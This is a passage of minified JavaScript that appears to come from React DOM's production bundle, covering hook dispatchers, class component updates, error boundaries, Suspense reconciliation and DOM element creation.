l!==null&&n!==null&&wl(n,l[1])?l[0]:(e=e(),o.memoizedState=[e,n],e)}function Lh(e,n,o){return(Jn&21)===0?(e.baseState&&(e.baseState=!1,ht=!0),e.memoizedState=o):(Lt(o,n)||(o=hu(),Le.lanes|=o,Qn|=o,e.baseState=!0),n)}function vv(e,n){var o=Se;Se=o!==0&&4>o?o:4,e(!0);var l=vl.transition;vl.transition={};try{e(!1),n()}finally{Se=o,vl.transition=l}}function Bh(){return It().memoizedState}function wv(e,n,o){var l=Pn(e);if(o={lane:l,action:o,hasEagerState:!1,eagerState:null,next:null},Nh(e))Fh(n,o);else if(o=gh(e,n,o,l),o!==null){var u=lt();Vt(o,e,l,u),zh(o,n,l)}}function kv(e,n,o){var l=Pn(e),u={lane:l,action:o,hasEagerState:!1,eagerState:null,next:null};if(Nh(e))Fh(n,u);else{var g=e.alternate;if(e.lanes===0&&(g===null||g.lanes===0)&&(g=n.lastRenderedReducer,g!==null))try{var b=n.lastRenderedState,k=g(b,o);if(u.hasEagerState=!0,u.eagerState=k,Lt(k,b)){var A=n.interleaved;A===null?(u.next=u,pl(n)):(u.next=A.next,A.next=u),n.interleaved=u;return}}catch{}finally{}o=gh(e,n,u,l),o!==null&&(u=lt(),Vt(o,e,l,u),zh(o,n,l))}}function Nh(e){var n=e.alternate;return e===Le||n!==null&&n===Le}function Fh(e,n){Or=to=!0;var o=e.pending;o===null?n.next=n:(n.next=o.next,o.next=n),e.pending=n}function zh(e,n,o){if((o&4194240)!==0){var l=n.lanes;l&=e.pendingLanes,o|=l,n.lanes=o,Pa(e,o)}}var ro={readContext:Pt,useCallback:nt,useContext:nt,useEffect:nt,useImperativeHandle:nt,useInsertionEffect:nt,useLayoutEffect:nt,useMemo:nt,useReducer:nt,useRef:nt,useState:nt,useDebugValue:nt,useDeferredValue:nt,useTransition:nt,useMutableSource:nt,useSyncExternalStore:nt,useId:nt,unstable_isNewReconciler:!1},xv={readContext:Pt,useCallback:function(e,n){return Jt().memoizedState=[e,n===void 0?null:n],e},useContext:Pt,useEffect:Ih,useImperativeHandle:function(e,n,o){return o=o!=null?o.concat([e]):null,no(4194308,4,Dh.bind(null,n,e),o)},useLayoutEffect:function(e,n){return no(4194308,4,e,n)},useInsertionEffect:function(e,n){return no(4,2,e,n)},useMemo:function(e,n){var o=Jt();return n=n===void 0?null:n,e=e(),o.memoizedState=[e,n],e},useReducer:function(e,n,o){var l=Jt();return n=o!==void 0?o(n):n,l.memoizedState=l.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},l.queue=e,e=e.dispatch=wv.bind(null,Le,e),[l.memoizedState,e]},useRef:function(e){var n=Jt();return e={current:e},n.memoizedState=e},useState:Eh,useDebugValue:Cl,useDeferredValue:function(e){return Jt().memoizedState=e},useTransition:function(){var e=Eh(!1),n=e[0];return e=vv.bind(null,e[1]),Jt().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,o){var l=Le,u=Jt();if(je){if(o===void 0)throw Error(r(407));o=o()}else{if(o=n(),Qe===null)throw Error(r(349));(Jn&30)!==0||xh(l,n,o)}u.memoizedState=o;var g={value:o,getSnapshot:n};return u.queue=g,Ih(Sh.bind(null,l,g,e),[e]),l.flags|=2048,Nr(9,Th.bind(null,l,g,o,n),void 0,null),o},useId:function(){var e=Jt(),n=Qe.identifierPrefix;if(je){var o=nn,l=tn;o=(l&~(1<<32-Ot(l)-1)).toString(32)+o,n=":"+n+"R"+o,o=Lr++,0<o&&(n+="H"+o.toString(32)),n+=":"}else o=bv++,n=":"+n+"r"+o.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},Tv={readContext:Pt,useCallback:jh,useContext:Pt,useEffect:Al,useImperativeHandle:Mh,useInsertionEffect:_h,useLayoutEffect:Rh,useMemo:Oh,useReducer:Tl,useRef:Ph,useState:function(){return Tl(Br)},useDebugValue:Cl,useDeferredValue:function(e){var n=It();return Lh(n,He.memoizedState,e)},useTransition:function(){var e=Tl(Br)[0],n=It().memoizedState;return[e,n]},useMutableSource:wh,useSyncExternalStore:kh,useId:Bh,unstable_isNewReconciler:!1},Sv={readContext:Pt,useCallback:jh,useContext:Pt,useEffect:Al,useImperativeHandle:Mh,useInsertionEffect:_h,useLayoutEffect:Rh,useMemo:Oh,useReducer:Sl,useRef:Ph,useState:function(){return Sl(Br)},useDebugValue:Cl,useDeferredValue:function(e){var n=It();return He===null?n.memoizedState=e:Lh(n,He.memoizedState,e)},useTransition:function(){var e=Sl(Br)[0],n=It().memoizedState;return[e,n]},useMutableSource:wh,useSyncExternalStore:kh,useId:Bh,unstable_isNewReconciler:!1};function Nt(e,n){if(e&&e.defaultProps){n=q({},n),e=e.defaultProps;for(var o in e)n[o]===void 0&&(n[o]=e[o]);return n}return n}function El(e,n,o,l){n=e.memoizedState,o=o(l,n),o=o==null?n:q({},n,o),e.memoizedState=o,e.lanes===0&&(e.updateQueue.baseState=o)}var so={isMounted:function(e){return(e=e._reactInternals)?Un(e)===e:!1},enqueueSetState:function(e,n,o){e=e._reactInternals;var l=lt(),u=Pn(e),g=sn(l,u);g.payload=n,o!=null&&(g.callback=o),n=Sn(e,g,u),n!==null&&(Vt(n,e,u,l),Ys(n,e,u))},enqueueReplaceState:function(e,n,o){e=e._reactInternals;var l=lt(),u=Pn(e),g=sn(l,u);g.tag=1,g.payload=n,o!=null&&(g.callback=o),n=Sn(e,g,u),n!==null&&(Vt(n,e,u,l),Ys(n,e,u))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var o=lt(),l=Pn(e),u=sn(o,l);u.tag=2,n!=null&&(u.callback=n),n=Sn(e,u,l),n!==null&&(Vt(n,e,l,o),Ys(n,e,l))}};function Vh(e,n,o,l,u,g,b){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(l,g,b):n.prototype&&n.prototype.isPureReactComponent?!Sr(o,l)||!Sr(u,g):!0}function Uh(e,n,o){var l=!1,u=kn,g=n.contextType;return typeof g=="object"&&g!==null?g=Pt(g):(u=ut(n)?$n:tt.current,l=n.contextTypes,g=(l=l!=null)?_i(e,u):kn),n=new n(o,g),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=so,e.stateNode=n,n._reactInternals=e,l&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=u,e.__reactInternalMemoizedMaskedChildContext=g),n}function Wh(e,n,o,l){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(o,l),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(o,l),n.state!==e&&so.enqueueReplaceState(n,n.state,null)}function Pl(e,n,o,l){var u=e.stateNode;u.props=o,u.state=e.memoizedState,u.refs={},fl(e);var g=n.contextType;typeof g=="object"&&g!==null?u.context=Pt(g):(g=ut(n)?$n:tt.current,u.context=_i(e,g)),u.state=e.memoizedState,g=n.getDerivedStateFromProps,typeof g=="function"&&(El(e,n,g,o),u.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof u.getSnapshotBeforeUpdate=="function"||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(n=u.state,typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount(),n!==u.state&&so.enqueueReplaceState(u,u.state,null),Xs(e,o,u,l),u.state=e.memoizedState),typeof u.componentDidMount=="function"&&(e.flags|=4194308)}function Ni(e,n){try{var o="",l=n;do o+=be(l),l=l.return;while(l);var u=o}catch(g){u=`
Error generating stack: `+g.message+`
`+g.stack}return{value:e,source:n,stack:u,digest:null}}function Il(e,n,o){return{value:e,source:null,stack:o??null,digest:n??null}}function _l(e,n){try{console.error(n.value)}catch(o){setTimeout(function(){throw o})}}var Av=typeof WeakMap=="function"?WeakMap:Map;function $h(e,n,o){o=sn(-1,o),o.tag=3,o.payload={element:null};var l=n.value;return o.callback=function(){po||(po=!0,Hl=l),_l(e,n)},o}function Hh(e,n,o){o=sn(-1,o),o.tag=3;var l=e.type.getDerivedStateFromError;if(typeof l=="function"){var u=n.value;o.payload=function(){return l(u)},o.callback=function(){_l(e,n)}}var g=e.stateNode;return g!==null&&typeof g.componentDidCatch=="function"&&(o.callback=function(){_l(e,n),typeof l!="function"&&(Cn===null?Cn=new Set([this]):Cn.add(this));var b=n.stack;this.componentDidCatch(n.value,{componentStack:b!==null?b:""})}),o}function Gh(e,n,o){var l=e.pingCache;if(l===null){l=e.pingCache=new Av;var u=new Set;l.set(n,u)}else u=l.get(n),u===void 0&&(u=new Set,l.set(n,u));u.has(o)||(u.add(o),e=Fv.bind(null,e,n,o),n.then(e,e))}function qh(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function Kh(e,n,o,l,u){return(e.mode&1)===0?(e===n?e.flags|=65536:(e.flags|=128,o.flags|=131072,o.flags&=-52805,o.tag===1&&(o.alternate===null?o.tag=17:(n=sn(-1,1),n.tag=2,Sn(o,n,1))),o.lanes|=1),e):(e.flags|=65536,e.lanes=u,e)}var Cv=O.ReactCurrentOwner,ht=!1;function at(e,n,o,l){n.child=e===null?fh(n,null,o,l):ji(n,e.child,o,l)}function Jh(e,n,o,l,u){o=o.render;var g=n.ref;return Li(n,u),l=kl(e,n,o,l,g,u),o=xl(),e!==null&&!ht?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~u,on(e,n,u)):(je&&o&&rl(n),n.flags|=1,at(e,n,l,u),n.child)}function Qh(e,n,o,l,u){if(e===null){var g=o.type;return typeof g=="function"&&!Xl(g)&&g.defaultProps===void 0&&o.compare===null&&o.defaultProps===void 0?(n.tag=15,n.type=g,Yh(e,n,g,l,u)):(e=vo(o.type,null,l,n,n.mode,u),e.ref=n.ref,e.return=n,n.child=e)}if(g=e.child,(e.lanes&u)===0){var b=g.memoizedProps;if(o=o.compare,o=o!==null?o:Sr,o(b,l)&&e.ref===n.ref)return on(e,n,u)}return n.flags|=1,e=_n(g,l),e.ref=n.ref,e.return=n,n.child=e}function Yh(e,n,o,l,u){if(e!==null){var g=e.memoizedProps;if(Sr(g,l)&&e.ref===n.ref)if(ht=!1,n.pendingProps=l=g,(e.lanes&u)!==0)(e.flags&131072)!==0&&(ht=!0);else return n.lanes=e.lanes,on(e,n,u)}return Rl(e,n,o,l,u)}function Xh(e,n,o){var l=n.pendingProps,u=l.children,g=e!==null?e.memoizedState:null;if(l.mode==="hidden")if((n.mode&1)===0)n.memoizedState={baseLanes:0,cachePool:null,transitions:null},Pe(zi,kt),kt|=o;else{if((o&1073741824)===0)return e=g!==null?g.baseLanes|o:o,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,Pe(zi,kt),kt|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},l=g!==null?g.baseLanes:o,Pe(zi,kt),kt|=l}else g!==null?(l=g.baseLanes|o,n.memoizedState=null):l=o,Pe(zi,kt),kt|=l;return at(e,n,u,o),n.child}function Zh(e,n){var o=n.ref;(e===null&&o!==null||e!==null&&e.ref!==o)&&(n.flags|=512,n.flags|=2097152)}function Rl(e,n,o,l,u){var g=ut(o)?$n:tt.current;return g=_i(n,g),Li(n,u),o=kl(e,n,o,l,g,u),l=xl(),e!==null&&!ht?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~u,on(e,n,u)):(je&&l&&rl(n),n.flags|=1,at(e,n,o,u),n.child)}function ep(e,n,o,l,u){if(ut(o)){var g=!0;Ws(n)}else g=!1;if(Li(n,u),n.stateNode===null)ao(e,n),Uh(n,o,l),Pl(n,o,l,u),l=!0;else if(e===null){var b=n.stateNode,k=n.memoizedProps;b.props=k;var A=b.context,j=o.contextType;typeof j=="object"&&j!==null?j=Pt(j):(j=ut(o)?$n:tt.current,j=_i(n,j));var F=o.getDerivedStateFromProps,z=typeof F=="function"||typeof b.getSnapshotBeforeUpdate=="function";z||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(k!==l||A!==j)&&Wh(n,b,l,j),Tn=!1;var N=n.memoizedState;b.state=N,Xs(n,l,b,u),A=n.memoizedState,k!==l||N!==A||dt.current||Tn?(typeof F=="function"&&(El(n,o,F,l),A=n.memoizedState),(k=Tn||Vh(n,o,k,l,N,A,j))?(z||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount()),typeof b.componentDidMount=="function"&&(n.flags|=4194308)):(typeof b.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=l,n.memoizedState=A),b.props=l,b.state=A,b.context=j,l=k):(typeof b.componentDidMount=="function"&&(n.flags|=4194308),l=!1)}else{b=n.stateNode,mh(e,n),k=n.memoizedProps,j=n.type===n.elementType?k:Nt(n.type,k),b.props=j,z=n.pendingProps,N=b.context,A=o.contextType,typeof A=="object"&&A!==null?A=Pt(A):(A=ut(o)?$n:tt.current,A=_i(n,A));var K=o.getDerivedStateFromProps;(F=typeof K=="function"||typeof b.getSnapshotBeforeUpdate=="function")||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(k!==z||N!==A)&&Wh(n,b,l,A),Tn=!1,N=n.memoizedState,b.state=N,Xs(n,l,b,u);var Z=n.memoizedState;k!==z||N!==Z||dt.current||Tn?(typeof K=="function"&&(El(n,o,K,l),Z=n.memoizedState),(j=Tn||Vh(n,o,j,l,N,Z,A)||!1)?(F||typeof b.UNSAFE_componentWillUpdate!="function"&&typeof b.componentWillUpdate!="function"||(typeof b.componentWillUpdate=="function"&&b.componentWillUpdate(l,Z,A),typeof b.UNSAFE_componentWillUpdate=="function"&&b.UNSAFE_componentWillUpdate(l,Z,A)),typeof b.componentDidUpdate=="function"&&(n.flags|=4),typeof b.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof b.componentDidUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(n.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(n.flags|=1024),n.memoizedProps=l,n.memoizedState=Z),b.props=l,b.state=Z,b.context=A,l=j):(typeof b.componentDidUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(n.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||k===e.memoizedProps&&N===e.memoizedState||(n.flags|=1024),l=!1)}return Dl(e,n,o,l,g,u)}function Dl(e,n,o,l,u,g){Zh(e,n);var b=(n.flags&128)!==0;if(!l&&!b)return u&&sh(n,o,!1),on(e,n,g);l=n.stateNode,Cv.current=n;var k=b&&typeof o.getDerivedStateFromError!="function"?null:l.render();return n.flags|=1,e!==null&&b?(n.child=ji(n,e.child,null,g),n.child=ji(n,null,k,g)):at(e,n,k,g),n.memoizedState=l.state,u&&sh(n,o,!0),n.child}function tp(e){var n=e.stateNode;n.pendingContext?ih(e,n.pendingContext,n.pendingContext!==n.context):n.context&&ih(e,n.context,!1),gl(e,n.containerInfo)}function np(e,n,o,l,u){return Mi(),ll(u),n.flags|=256,at(e,n,o,l),n.child}var Ml={dehydrated:null,treeContext:null,retryLane:0};function jl(e){return{baseLanes:e,cachePool:null,transitions:null}}function ip(e,n,o){var l=n.pendingProps,u=Oe.current,g=!1,b=(n.flags&128)!==0,k;if((k=b)||(k=e!==null&&e.memoizedState===null?!1:(u&2)!==0),k?(g=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(u|=1),Pe(Oe,u&1),e===null)return al(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?((n.mode&1)===0?n.lanes=1:e.data==="$!"?n.lanes=8:n.lanes=1073741824,null):(b=l.children,e=l.fallback,g?(l=n.mode,g=n.child,b={mode:"hidden",children:b},(l&1)===0&&g!==null?(g.childLanes=0,g.pendingProps=b):g=wo(b,l,0,null),e=ei(e,l,o,null),g.return=n,e.return=n,g.sibling=e,n.child=g,n.child.memoizedState=jl(o),n.memoizedState=Ml,e):Ol(n,b));if(u=e.memoizedState,u!==null&&(k=u.dehydrated,k!==null))return Ev(e,n,b,l,k,u,o);if(g){g=l.fallback,b=n.mode,u=e.child,k=u.sibling;var A={mode:"hidden",children:l.children};return(b&1)===0&&n.child!==u?(l=n.child,l.childLanes=0,l.pendingProps=A,n.deletions=null):(l=_n(u,A),l.subtreeFlags=u.subtreeFlags&14680064),k!==null?g=_n(k,g):(g=ei(g,b,o,null),g.flags|=2),g.return=n,l.return=n,l.sibling=g,n.child=l,l=g,g=n.child,b=e.child.memoizedState,b=b===null?jl(o):{baseLanes:b.baseLanes|o,cachePool:null,transitions:b.transitions},g.memoizedState=b,g.childLanes=e.childLanes&~o,n.memoizedState=Ml,l}return g=e.child,e=g.sibling,l=_n(g,{mode:"visible",children:l.children}),(n.mode&1)===0&&(l.lanes=o),l.return=n,l.sibling=null,e!==null&&(o=n.deletions,o===null?(n.deletions=[e],n.flags|=16):o.push(e)),n.child=l,n.memoizedState=null,l}function Ol(e,n){return n=wo({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function oo(e,n,o,l){return l!==null&&ll(l),ji(n,e.child,null,o),e=Ol(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function Ev(e,n,o,l,u,g,b){if(o)return n.flags&256?(n.flags&=-257,l=Il(Error(r(422))),oo(e,n,b,l)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(g=l.fallback,u=n.mode,l=wo({mode:"visible",children:l.children},u,0,null),g=ei(g,u,b,null),g.flags|=2,l.return=n,g.return=n,l.sibling=g,n.child=l,(n.mode&1)!==0&&ji(n,e.child,null,b),n.child.memoizedState=jl(b),n.memoizedState=Ml,g);if((n.mode&1)===0)return oo(e,n,b,null);if(u.data==="$!"){if(l=u.nextSibling&&u.nextSibling.dataset,l)var k=l.dgst;return l=k,g=Error(r(419)),l=Il(g,l,void 0),oo(e,n,b,l)}if(k=(b&e.childLanes)!==0,ht||k){if(l=Qe,l!==null){switch(b&-b){case 4:u=2;break;case 16:u=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:u=32;break;case 536870912:u=268435456;break;default:u=0}u=(u&(l.suspendedLanes|b))!==0?0:u,u!==0&&u!==g.retryLane&&(g.retryLane=u,rn(e,u),Vt(l,e,u,-1))}return Yl(),l=Il(Error(r(421))),oo(e,n,b,l)}return u.data==="$?"?(n.flags|=128,n.child=e.child,n=zv.bind(null,e),u._reactRetry=n,null):(e=g.treeContext,wt=vn(u.nextSibling),vt=n,je=!0,Bt=null,e!==null&&(Ct[Et++]=tn,Ct[Et++]=nn,Ct[Et++]=Hn,tn=e.id,nn=e.overflow,Hn=n),n=Ol(n,l.children),n.flags|=4096,n)}function rp(e,n,o){e.lanes|=n;var l=e.alternate;l!==null&&(l.lanes|=n),hl(e.return,n,o)}function Ll(e,n,o,l,u){var g=e.memoizedState;g===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:l,tail:o,tailMode:u}:(g.isBackwards=n,g.rendering=null,g.renderingStartTime=0,g.last=l,g.tail=o,g.tailMode=u)}function sp(e,n,o){var l=n.pendingProps,u=l.revealOrder,g=l.tail;if(at(e,n,l.children,o),l=Oe.current,(l&2)!==0)l=l&1|2,n.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&rp(e,o,n);else if(e.tag===19)rp(e,o,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}l&=1}if(Pe(Oe,l),(n.mode&1)===0)n.memoizedState=null;else switch(u){case"forwards":for(o=n.child,u=null;o!==null;)e=o.alternate,e!==null&&Zs(e)===null&&(u=o),o=o.sibling;o=u,o===null?(u=n.child,n.child=null):(u=o.sibling,o.sibling=null),Ll(n,!1,u,o,g);break;case"backwards":for(o=null,u=n.child,n.child=null;u!==null;){if(e=u.alternate,e!==null&&Zs(e)===null){n.child=u;break}e=u.sibling,u.sibling=o,o=u,u=e}Ll(n,!0,o,null,g);break;case"together":Ll(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function ao(e,n){(n.mode&1)===0&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function on(e,n,o){if(e!==null&&(n.dependencies=e.dependencies),Qn|=n.lanes,(o&n.childLanes)===0)return null;if(e!==null&&n.child!==e.child)throw Error(r(153));if(n.child!==null){for(e=n.child,o=_n(e,e.pendingProps),n.child=o,o.return=n;e.sibling!==null;)e=e.sibling,o=o.sibling=_n(e,e.pendingProps),o.return=n;o.sibling=null}return n.child}function Pv(e,n,o){switch(n.tag){case 3:tp(n),Mi();break;case 5:vh(n);break;case 1:ut(n.type)&&Ws(n);break;case 4:gl(n,n.stateNode.containerInfo);break;case 10:var l=n.type._context,u=n.memoizedProps.value;Pe(Js,l._currentValue),l._currentValue=u;break;case 13:if(l=n.memoizedState,l!==null)return l.dehydrated!==null?(Pe(Oe,Oe.current&1),n.flags|=128,null):(o&n.child.childLanes)!==0?ip(e,n,o):(Pe(Oe,Oe.current&1),e=on(e,n,o),e!==null?e.sibling:null);Pe(Oe,Oe.current&1);break;case 19:if(l=(o&n.childLanes)!==0,(e.flags&128)!==0){if(l)return sp(e,n,o);n.flags|=128}if(u=n.memoizedState,u!==null&&(u.rendering=null,u.tail=null,u.lastEffect=null),Pe(Oe,Oe.current),l)break;return null;case 22:case 23:return n.lanes=0,Xh(e,n,o)}return on(e,n,o)}var op,Bl,ap,lp;op=function(e,n){for(var o=n.child;o!==null;){if(o.tag===5||o.tag===6)e.appendChild(o.stateNode);else if(o.tag!==4&&o.child!==null){o.child.return=o,o=o.child;continue}if(o===n)break;for(;o.sibling===null;){if(o.return===null||o.return===n)return;o=o.return}o.sibling.return=o.return,o=o.sibling}},Bl=function(){},ap=function(e,n,o,l){var u=e.memoizedProps;if(u!==l){e=n.stateNode,Kn(Kt.current);var g=null;switch(o){case"input":u=ha(e,u),l=ha(e,l),g=[];break;case"select":u=q({},u,{value:void 0}),l=q({},l,{value:void 0}),g=[];break;case"textarea":u=ga(e,u),l=ga(e,l),g=[];break;default:typeof u.onClick!="function"&&typeof l.onClick=="function"&&(e.onclick=zs)}ya(o,l);var b;o=null;for(j in u)if(!l.hasOwnProperty(j)&&u.hasOwnProperty(j)&&u[j]!=null)if(j==="style"){var k=u[j];for(b in k)k.hasOwnProperty(b)&&(o||(o={}),o[b]="")}else j!=="dangerouslySetInnerHTML"&&j!=="children"&&j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&j!=="autoFocus"&&(a.hasOwnProperty(j)?g||(g=[]):(g=g||[]).push(j,null));for(j in l){var A=l[j];if(k=u?.[j],l.hasOwnProperty(j)&&A!==k&&(A!=null||k!=null))if(j==="style")if(k){for(b in k)!k.hasOwnProperty(b)||A&&A.hasOwnProperty(b)||(o||(o={}),o[b]="");for(b in A)A.hasOwnProperty(b)&&k[b]!==A[b]&&(o||(o={}),o[b]=A[b])}else o||(g||(g=[]),g.push(j,o)),o=A;else j==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,k=k?k.__html:void 0,A!=null&&k!==A&&(g=g||[]).push(j,A)):j==="children"?typeof A!="string"&&typeof A!="number"||(g=g||[]).push(j,""+A):j!=="suppressContentEditableWarning"&&j!=="suppressHydrationWarning"&&(a.hasOwnProperty(j)?(A!=null&&j==="onScroll"&&Re("scroll",e),g||k===A||(g=[])):(g=g||[]).push(j,A))}o&&(g=g||[]).push("style",o);var j=g;(n.updateQueue=j)&&(n.flags|=4)}},lp=function(e,n,o,l){o!==l&&(n.flags|=4)};function Fr(e,n){if(!je)switch(e.tailMode){case"hidden":n=e.tail;for(var o=null;n!==null;)n.alternate!==null&&(o=n),n=n.sibling;o===null?e.tail=null:o.sibling=null;break;case"collapsed":o=e.tail;for(var l=null;o!==null;)o.alternate!==null&&(l=o),o=o.sibling;l===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:l.sibling=null}}function it(e){var n=e.alternate!==null&&e.alternate.child===e.child,o=0,l=0;if(n)for(var u=e.child;u!==null;)o|=u.lanes|u.childLanes,l|=u.subtreeFlags&14680064,l|=u.flags&14680064,u.return=e,u=u.sibling;else for(u=e.child;u!==null;)o|=u.lanes|u.childLanes,l|=u.subtreeFlags,l|=u.flags,u.return=e,u=u.sibling;return e.subtreeFlags|=l,e.childLanes=o,n}function Iv(e,n,o){var l=n.pendingProps;switch(sl(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return it(n),null;case 1:return ut(n.type)&&Us(),it(n),null;case 3:return l=n.stateNode,Bi(),De(dt),De(tt),bl(),l.pendingContext&&(l.context=l.pendingContext,l.pendingContext=null),(e===null||e.child===null)&&(qs(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&(n.flags&256)===0||(n.flags|=1024,Bt!==null&&(Kl(Bt),Bt=null))),Bl(e,n),it(n),null;case 5:ml(n);var u=Kn(jr.current);if(o=n.type,e!==null&&n.stateNode!=null)ap(e,n,o,l,u),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!l){if(n.stateNode===null)throw Error(r(166));return it(n),null}if(e=Kn(Kt.current),qs(n)){l=n.stateNode,o=n.type;var g=n.memoizedProps;switch(l[qt]=n,l[Ir]=g,e=(n.mode&1)!==0,o){case"dialog":Re("cancel",l),Re("close",l);break;case"iframe":case"object":case"embed":Re("load",l);break;case"video":case"audio":for(u=0;u<Cr.length;u++)Re(Cr[u],l);break;case"source":Re("error",l);break;case"img":case"image":case"link":Re("error",l),Re("load",l);break;case"details":Re("toggle",l);break;case"input":Ud(l,g),Re("invalid",l);break;case"select":l._wrapperState={wasMultiple:!!g.multiple},Re("invalid",l);break;case"textarea":Hd(l,g),Re("invalid",l)}ya(o,g),u=null;for(var b in g)if(g.hasOwnProperty(b)){var k=g[b];b==="children"?typeof k=="string"?l.textContent!==k&&(g.suppressHydrationWarning!==!0&&Fs(l.textContent,k,e),u=["children",k]):typeof k=="number"&&l.textContent!==""+k&&(g.suppressHydrationWarning!==!0&&Fs(l.textContent,k,e),u=["children",""+k]):a.hasOwnProperty(b)&&k!=null&&b==="onScroll"&&Re("scroll",l)}switch(o){case"input":At(l),$d(l,g,!0);break;case"textarea":At(l),qd(l);break;case"select":case"option":break;default:typeof g.onClick=="function"&&(l.onclick=zs)}l=u,n.updateQueue=l,l!==null&&(n.flags|=4)}else{b=u.nodeType===9?u:u.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Kd(o)),e==="http://www.w3.org/1999/xhtml"?o==="script"?(e=b.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof l.is=="string"?e=b.createElement(o,{is:l.is}):(e=b.createElement(o),o==="select"&&(b=e,l.multiple?b.multiple=!0:l.size&&(b.size=l.size))):e=b.createElementNS(e,o),e[qt]=n,e[Ir]=l,op(e,n,!1,!1),n.stateNode=e;e:{switch(b=ba(o,l),o){case"dialog":Re("cancel",e),Re("close",e),u=l;break;case"iframe":case"object":case"embed":Re("load",e),u=l;break;case"video":case"audio":for(u=0;u<Cr.length;u++)Re(Cr[u],e);u=l;break;case"source":Re("error",e),u=l;break;case"img":case"image":case"link":Re("error",e),Re("load",e),u=l;break;case"details":Re("toggle",e),u=l;break;case"input":Ud(e,l),u=ha(e,l),Re("invalid",e);break;case"option":u=l;break;case"select":e._wrapperState={wasMultiple:!!l.multiple},u=q({},l,{value:void 0}),Re("invalid",e);break;case"textarea":Hd(e,l),u=ga(e,l),Re("invalid",e);break;default:u=l}ya(o,u),k=u;for(g in k)if(k.hasOwnProperty(g)){var A=k[g];g==="style"?Yd(e,A):g==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,A!=null&&Jd(e,A)):g==="children"?typeof A=="string"?(o!=="textarea"||A!=="")&&ar(e,A):typeof A=="number"&&ar(e,""+A):g!=="suppressContentEditableWarning"&&g!=="suppressHydrationWarning"&&g!=="autoFocus"&&(a.hasOwnProperty(g)?A!=null&&g==="onScroll"&&Re("scroll",e):A!=null&&M(e,g,A,b))}switch(o){case"input":At(e),$d(e,l,!1);break;case"textarea":At(e),qd(e);break;case"option":l.value!=null&&e.setAttribute("value",""+xe(l.value));break;case"select":e.multiple=!!l.multiple,g=l.value,g!=null?bi(e,!!l.multiple,g,!1):l.defaultValue!=null&&bi(e,!!l.multiple,l.defaultValue,!0);break;default:typeof u.onClick=="function"&&(e.onclick=zs)}switch(o){case"button":case"input":case"select":case"textarea":l=!!l.autoFocus;break e;case"img":l=!0;break e;default:l=!1}}l&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return it(n),null;case 6:if(e&&n.stateNode!=null)lp(e,n,e.memoizedProps,l);else{if(typeof l!="string"&&n.stateNode===null)throw Error(r(166));if(o=Kn(jr.current),Kn(Kt.current),qs(n)){if(l=n.stateNode,o=n.memoizedProps,l[qt]=n,(g=l.nodeValue!==o)&&(e=vt,e!==null))switch(e.tag){case 3:Fs(l.nodeValue,o,(e.mode&1)!==0);break;case 